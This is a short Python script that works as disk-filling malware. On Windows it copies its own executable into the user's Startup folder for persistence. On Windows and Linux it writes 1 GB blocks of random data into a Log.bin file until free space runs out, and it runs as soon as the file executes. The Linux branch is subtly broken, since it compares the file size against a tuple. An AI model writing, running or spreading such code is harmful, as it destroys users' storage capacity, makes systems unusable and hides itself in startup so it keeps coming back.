import os
import shutil
import platform
import sys

def fillingMemory():

    if platform.system() == "Windows":
        destinationDir = os.environ.get("SystemDrive") + "\\Log"

        # calculate amount of space in windows Drive
        SystemDrive = os.environ.get("SystemDrive")
        freeSpace = shutil.disk_usage(SystemDrive)[2]

        # moving file to startup system
        sourceFile = os.path.abspath(sys.executable)
        startupFolder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
        if not os.path.exists(os.path.join(startupFolder, os.path.basename(sourceFile))):
            shutil.copy(sourceFile, startupFolder)
    elif platform.system() == "Linux":
        destinationDir = "/home/Log"
        freeSpace = shutil.disk_usage("/")
    if not os.path.exists(destinationDir):
        os.makedirs(destinationDir)
    destinationFile = os.path.join(destinationDir, "Log.bin")

    file = open(destinationFile, "wb")
    while os.path.getsize(destinationFile) < freeSpace:
        file.write(os.urandom(1024 * 1024 * 1024))
    file.close()


fillingMemory()
